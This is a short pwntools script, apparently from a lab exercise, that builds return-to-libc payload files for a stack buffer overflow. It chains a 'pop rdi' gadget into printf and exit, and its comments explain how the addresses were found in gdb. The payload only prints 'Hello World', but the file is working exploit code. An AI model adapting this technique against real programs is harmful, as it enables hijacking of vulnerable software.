from pwn import *

lenfill = 65

rbpAddress = b'22222222'

# Address is acquired after running gdb < payload_libc_gdb, and pick one address from ropsearch "pop rdi" libc
ripAddress = p64(0x00007ffff7b37828)

# Address is acquired after running gdb < payload_libc_gdb, and p printf
printfAddress = p64(0x7ffff7a62800)

# Address is acquired after running gdb < payload_libc_gdb, and p exit
exitAddress = p64(0x7ffff7a47030)

# After overflowing the programme, (lenfill = 65), and making the rbp address invalid, we can trace using info frame: rbp at 0x7fffffffde80, rip at 0x7fffffffde88
# Our payload is designed to be that the string 'hello' is at an offset of 5 x 8 = 40 (dec) bytes, hence we add the rbp address by x28. We have the string address as seen.
stringAddress_gdb = p64(0x7fffffffdea8)

# After overflowing the programme, (lenfill = 65), and making the rbp address invalid, we can trace using info frame: rbp at 0x7fffffffdec0, rip at 0x7fffffffdec8
# Our payload is designed to be that the string 'hello' is at an offset of 5 x 8 = 40 (dec) bytes, hence we add the rbp address by x28. We have the string address as seen.
stringAddress = p64(0x7fffffffdee8)

with open('payload_libc_gdb','wb') as f:
    f.write(b'A' * (lenfill) + rbpAddress + ripAddress + stringAddress_gdb + printfAddress + exitAddress + b'Hello World' + b'\n')

with open('payload_libc','wb') as f:
	f.write(b'A' * (lenfill) + rbpAddress + ripAddress + stringAddress + printfAddress + exitAddress + b'Hello World' + b'\n')